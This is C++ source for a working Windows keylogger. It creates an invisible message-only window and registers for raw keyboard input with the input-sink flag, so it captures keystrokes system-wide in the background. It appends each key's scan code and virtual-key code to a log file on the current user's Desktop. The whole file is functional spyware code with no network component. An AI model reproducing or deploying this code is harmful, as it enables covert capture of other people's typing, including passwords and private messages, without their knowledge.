// Keylogger.cpp : Defines the entry point for the application.
//

#include "framework.h"
#include "Keylogger.h"
#include "strsafe.h"
#include "Lmcons.h"

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;                                // Current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // The main window class name
BOOL rawInputRegistered = false;				// Whether the raw input is registered
HANDLE hFile = INVALID_HANDLE_VALUE;
const unsigned int textBufferSize = 42;
char textBuffer[textBufferSize];

// Forward declarations of functions included in this code module:
BOOL				OpenFile();
void				CloseFile();
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// Initialize global strings
	LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadStringW(hInstance, IDC_KEYLOGGER, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// Perform application initialization:
	if (!InitInstance(hInstance, nCmdShow))
	{
		return FALSE;
	}

	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_KEYLOGGER));

	MSG msg;

	// Main message loop:
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return (int)msg.wParam;
}



//
//  FUNCTION: OpenFile() {
// 
//  PURPOSE: Opens the log file.
//
BOOL OpenFile()
{
	// Close the file if already open.
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
	}

	// Get current user name.
	TCHAR userName[UNLEN + 1];
	DWORD userNameSize = UNLEN + 1;
	GetUserName(userName, &userNameSize);

	TCHAR fileName[MAX_PATH];

	// Build the file path.
	const TCHAR* pathL = TEXT("C:/Users/");
	const TCHAR* pathR = TEXT("/Desktop/log.log");
	_sntprintf_s(fileName, MAX_PATH, _T("%s%s%s"), pathL, userName, pathR);

	hFile = CreateFile(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	SetFilePointer(hFile, 0, NULL, FILE_END);
	return TRUE;
}

//
//	FUNCTION: CloseFile()
//
//	PURPOSE: Closes the log file.
//
void CloseFile()
{
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;
	}
}

//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEXW wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_KEYLOGGER));
	wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_KEYLOGGER);
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // Store instance handle in our global variable

	HWND hWnd = CreateWindowW(szWindowClass, szTitle, 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, hInstance, nullptr);

	if (!hWnd)
	{
		return FALSE;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE: Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
	{
		RAWINPUTDEVICE Rid;

		Rid.usUsagePage = 0x01;          // HID_USAGE_PAGE_GENERIC
		Rid.usUsage = 0x06;              // HID_USAGE_GENERIC_KEYBOARD
		Rid.dwFlags = RIDEV_NOLEGACY | RIDEV_INPUTSINK;    // adds keyboard and also ignores legacy keyboard messages
		Rid.hwndTarget = hWnd;

		if (!RegisterRawInputDevices(&Rid, 1, sizeof(Rid))) {
			PostMessage(hWnd, WM_CLOSE, 0, 0);
		}
		else {
			if (!OpenFile()) {
				PostMessage(hWnd, WM_CLOSE, 0, 0);
			}
		}
	}
	break;
	case WM_INPUT:
	{
		UINT dwSize = 0;

		GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
		LPBYTE lpb = new BYTE[dwSize];
		if (lpb == NULL)
		{
			return 0;
		}

		if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize)
			OutputDebugString(TEXT("GetRawInputData does not return correct size !\n"));

		RAWINPUT* raw = (RAWINPUT*)lpb;

		if (raw->header.dwType == RIM_TYPEKEYBOARD)
		{
#ifdef _DEBUG
			const unsigned int outputBufferSize = 42;
			TCHAR outputBuffer[outputBufferSize];
			_sntprintf_s(outputBuffer, outputBufferSize,
				_T("%04x %04x %04x %04x %08x %08x\r\n"),
				raw->data.keyboard.MakeCode,
				raw->data.keyboard.Flags,
				raw->data.keyboard.Reserved,
				raw->data.keyboard.VKey,
				raw->data.keyboard.Message,
				raw->data.keyboard.ExtraInformation
			);

			OutputDebugString(outputBuffer);
#endif

			sprintf_s(textBuffer, textBufferSize,
				"%x %x %x %x %x %x\n",
				raw->data.keyboard.MakeCode,
				raw->data.keyboard.Flags,
				raw->data.keyboard.Reserved,
				raw->data.keyboard.VKey,
				raw->data.keyboard.Message,
				raw->data.keyboard.ExtraInformation
			);

			if (hFile != INVALID_HANDLE_VALUE) {
				DWORD len = (DWORD)strnlen_s(textBuffer, textBufferSize);
				WriteFile(hFile, (void*)textBuffer, len, NULL, NULL);
			}
		}

		delete[] lpb;
		return 0;
	}
	case WM_COMMAND:
	{
		int wmId = LOWORD(wParam);
		// Parse the menu selections:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
	}
	break;
	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd, &ps);
		EndPaint(hWnd, &ps);
	}
	break;
	case WM_DESTROY:
		CloseFile();
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}
